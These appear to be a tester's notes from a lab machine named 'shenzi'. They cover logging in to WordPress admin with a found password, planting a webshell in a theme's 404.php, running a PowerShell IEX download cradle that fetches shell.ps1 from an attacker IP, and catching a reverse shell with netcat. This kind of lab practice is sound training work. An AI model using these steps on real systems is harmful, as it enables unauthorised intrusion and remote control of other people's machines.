# 4 :80 wordpress > shenzi

```
After a lot of guessing, found wordpress at
http://192.168.125.55/shenzi/wp-admin/
Using admin:FeltHeadwallWight357

# webshell
Updated web.php > http://192.168.125.55/shenzi/wp-admin/theme-editor.php?file=404.php&theme=twentytwenty
http://192.168.125.55/shenzi/wp-content/themes/twentytwenty/404.php

# tried nishang; didnt get connection back
CMD: netsh firewall show state

Firewall status:
-------------------------------------------------------------------
Profile                           = Standard
Operational mode                  = Enable
Exception mode                    = Enable
Multicast/broadcast response mode = Enable
Notification mode                 = Enable
Group policy version              = Windows Defender Firewall
Remote admin mode                 = Disable

Ports currently open on all network interfaces:
Port   Protocol  Version  Program
-------------------------------------------------------------------
7680   TCP       Any      (null)
5040   TCP       Any      (null)
3306   TCP       Any      (null)
445    TCP       Any      (null)
443    TCP       Any      (null)
139    TCP       Any      (null)
135    TCP       Any      (null)
80     TCP       Any      (null)
21     TCP       Any      (null)

# using 443 as port
CMD: powershell IEX(New-Object Net.WebClient).downloadString('http://192.168.49.125/shell.ps1')

$ nc -lvnp 443                                                                                                                                                                                                                          1 ⨯
listening on [any] 443 ...
connect to [192.168.49.125] from (UNKNOWN) [192.168.125.55] 49859
Windows PowerShell running as user shenzi on SHENZI
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\xampp\htdocs\shenzi\wp-content\themes\twentytwenty>whoami
shenzi\shenzi
```
